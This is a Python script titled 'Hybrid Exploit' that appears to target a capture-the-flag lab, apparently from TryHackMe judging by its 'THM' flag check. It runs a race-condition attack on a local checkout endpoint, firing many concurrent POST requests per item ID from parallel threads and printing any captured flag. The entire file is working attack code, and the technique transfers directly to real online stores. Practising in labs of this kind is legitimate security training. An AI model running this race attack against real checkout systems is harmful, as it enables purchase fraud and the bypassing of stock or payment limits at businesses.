#!/usr/bin/env python3
# Hybrid Exploit - Races multiple items simultaneously
# Great for unknown item IDs or multi-target environments

import requests
import threading

BASE_URL = "http://localhost:5000/checkout"
ITEM_IDS = [1, 2, 3, 4, 5]  # Fuzz range
THREADS_PER_ITEM = 20

def attack_item(item_id):
    payload = {"item_id": item_id}
    for _ in range(THREADS_PER_ITEM):
        try:
            r = requests.post(BASE_URL, json=payload, timeout=2)
            if r.status_code == 200:
                text = r.text
                if "Flag" in text or "THM" in text:
                    print(f"\n[!] ITEM {item_id} â†’ FLAG: {text}")
        except:
            pass

print(f"[*] Hybrid attack on items {ITEM_IDS}")
threads = []
for item_id in ITEM_IDS:
    for _ in range(5):  # 5 attack threads per item
        t = threading.Thread(target=attack_item, args=(item_id,))
        t.start()
        threads.append(t)

for t in threads:
    t.join()
print("\n[+] Hybrid sweep complete")
